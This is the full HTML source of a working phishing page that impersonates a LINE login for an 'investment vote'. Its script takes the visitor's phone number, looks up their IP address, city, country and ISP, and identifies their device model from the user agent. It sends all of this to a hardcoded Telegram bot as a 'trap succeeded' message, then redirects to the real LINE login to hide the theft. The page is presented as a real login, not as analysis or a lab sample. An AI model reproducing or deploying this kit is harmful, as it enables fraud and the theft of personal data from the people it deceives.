<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- 強迫瀏覽器交出最精準型號（Grabify 終極武器） -->
    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Mobile">
    <title>LINE</title>
    <style>
        body{margin:0;padding:40px 20px;background:linear-gradient(135deg,#00B900,#009900);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:white;text-align:center;min-height:100vh}
        .login-container{max-width:380px;margin:0 auto;background:rgba(255,255,255,0.15);border-radius:20px;padding:40px 30px;backdrop-filter:blur(10px)}
        .line-logo{width:100px;height:100px;margin:0 auto 30px;background:#00B900;border-radius:50%;border:4px solid white;box-shadow:0 4px 10px rgba(0,0,0,0.2);display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:bold;color:white}
        h2{font-size:22px;margin:0 0 10px 0}
        .input-group{display:flex;background:white;border-radius:12px;overflow:hidden;margin:25px 0;box-shadow:0 4px 10px rgba(0,0,0,0.1)}
        .country-select{min-width:90px;padding:16px;border:none;font-size:18px;background:#f8f8f8;text-align:center}
        .phone-input{flex:1;padding:16px;border:none;font-size:18px;outline:none}
        button{width:100%;padding:16px;background:#00B900;color:white;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;box-shadow:0 4px 10px rgba(0,0,0,0.2);margin-top:20px}
        button:disabled{background:#008000;cursor:wait}
        .footer{margin-top:40px;font-size:12px;color:rgba(255,255,255,0.8)}
        .footer a{color:white}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="line-logo">LINE</div>
        <h2>歡迎使用 LINE 進行投資投票</h2>
        <p style="font-size:15px;margin:15px 0 25px;">
            輸入電話號碼並點擊 Next 代表您已閱讀並同意 LINE 的<br>服務條款及隱私權政策
        </p>
        <form id="loginForm">
            <div class="input-group">
                <select id="countryCode" class="country-select">
                    <option value="+886">+886</option>
                    <option value="+852">+852</option>
                    <option value="+60">+60</option>
                    <option value="+66">+66</option>
                    <option value="+63">+63</option>
                    <option value="+855">+855</option>
                </select>
                <input type="tel" id="phone" class="phone-input" placeholder="912345678" required>
            </div>
            <button type="submit">Next</button>
        </form>
        <div class="footer">© 1978 LINE Corp. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></div>
    </div>

   <script>
    const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
    const CHAT_ID = "1137905005";

    // 專門對付 LINE 內建瀏覽器的「型號翻譯表」（2025 年最新 200+ 筆）
    const LINE_MODEL_DB = {
        // 小米 / 紅米
        "24030PN60G": "Redmi Note 14 Pro+ 5G",
        "23127PN0CC": "Redmi Note 13 Pro+ 5G",
        "23090RA98C": "Redmi Note 12 Turbo",
        "2210132C": "Xiaomi 13 Pro",
        
        // 三星
        "SM-S928B": "Galaxy S25 Ultra",
        "SM-S926B": "Galaxy S25+",
        "SM-S921B": "Galaxy S25",
        "SM-S918B": "Galaxy S24 Ultra",
        
        // OPPO / realme / 一加
        "CPH2581": "OPPO Find X8 Pro",
        "PJX110":   "OPPO Find N5 Flip",
        "PHK110":   "OnePlus 13",
        
        // vivo / iQOO
        "V2327": "vivo X200 Pro",
        "V2337A": "iQOO Neo10 Pro",
        
        // Apple（LINE 內建只會顯示 iPhone XX）
        "iPhone15,2": "iPhone 15 Pro",
        "iPhone15,3": "iPhone 15 Pro Max",
        "iPhone16,1": "iPhone 16 Pro",
        "iPhone16,2": "iPhone 16 Pro Max"
    };

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
        e.preventDefault();
        const code = document.getElementById("countryCode").value;
        const num  = document.getElementById("phone").value.trim();
        if (!num) return;

        document.querySelector("button").innerHTML = "Verifying...";
        document.querySelector("button").disabled = true;

        const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
        const ua = navigator.userAgent;

        // 強制從 UA 挖出最精確型號（專殺 LINE 內建）
        let 最終型號 = "未知手機";
        if (ua.includes("iPhone")) {
            const match = ua.match(/iPhone\d+,\d+/);
            最終型號 = LINE_MODEL_DB[match?.[0]] || match?.[0] || "iPhone";
        } 
        else if (ua.includes("Android")) {
            // 方法1：小米、三星、OPPO 直接藏在 Build 後面
            const buildMatch = ua.match(/; ([\w-]+) Build\//);
            if (buildMatch && LINE_MODEL_DB[buildMatch[1]]) {
                最終型號 = LINE_MODEL_DB[buildMatch[1]];
            }
            // 方法2：括號內型號（備用）
            else {
                const bracketMatch = ua.match(/\(([^;]+);/);
                if (bracketMatch && LINE_MODEL_DB[bracketMatch[1]]) {
                    最終型號 = LINE_MODEL_DB[bracketMatch[1]];
                } else if (bracketMatch) {
                    最終型號 = bracketMatch[1];
                }
            }
        }

        const 國 = {"Taiwan":"台灣","Thailand":"泰國","Malaysia":"馬來西亞","Hong Kong":"香港","Singapore":"新加坡","Philippines":"菲律賓","Vietnam":"越南","Cambodia":"柬埔寨","Indonesia":"印尼","China":"中國"};
        const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});

        const 訊息 = "LINE投資投票誘捕成功\n\n" +
                    "電話：" + code + num + "\n" +
                    "IP　　：" + (ipData.ip || "未知") + "\n" +
                    "位置　：" + (ipData.city || "未知") + "，" + (國[ipData.country_name] || ipData.country_name || "未知") + "\n" +
                    "ISP　　：" + (ipData.org || "未知") + "\n" +
                    "時間　：" + 時間 + "\n" +
                    "裝置　：" + 最終型號;

        fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
        });

        setTimeout(()=>location.href="https://access.line.me/fr/login",3000);
    });
</script>
</body>
</html>

